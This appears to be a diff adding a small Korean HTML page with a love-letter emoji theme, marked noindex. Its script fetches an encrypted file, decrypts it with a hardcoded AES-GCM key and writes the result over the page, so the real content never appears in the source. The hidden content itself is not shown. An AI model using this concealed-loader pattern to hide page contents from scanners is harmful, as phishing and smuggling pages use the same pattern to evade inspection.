@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+<meta name="theme-color" content="#ffeef3">
+<title>&#128140;</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%92%8C%3C/text%3E%3C/svg%3E">
+<style>
+html { background: linear-gradient(160deg,#ffeef3,#fff7f0 55%,#ffe9ef); min-height: 100%; }
+#w { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 54px; animation: b 1.2s ease-in-out infinite; }
+@keyframes b { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+</style>
+</head>
+<body>
+<div id="w">&#128140;</div>
+<script>
+(async function () {
+  try {
+    var res = await fetch('p.bin');
+    var buf = await res.arrayBuffer();
+    var key = await crypto.subtle.importKey('raw', new Uint8Array([223,137,155,162,60,64,183,190,220,166,217,118,69,158,205,68,16,168,191,243,155,144,63,61,86,97,254,100,30,115,41,178]), 'AES-GCM', false, ['decrypt']);
+    var pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: new Uint8Array(buf.slice(0, 12)) }, key, buf.slice(12));
+    var html = new TextDecoder().decode(pt);
+    document.open();
+    document.write(html);
+    document.close();
+  } catch (e) {
+    document.getElementById('w').textContent = '\uD83D\uDC94';
+  }
+})();
+</script>
+</body>
+</html>
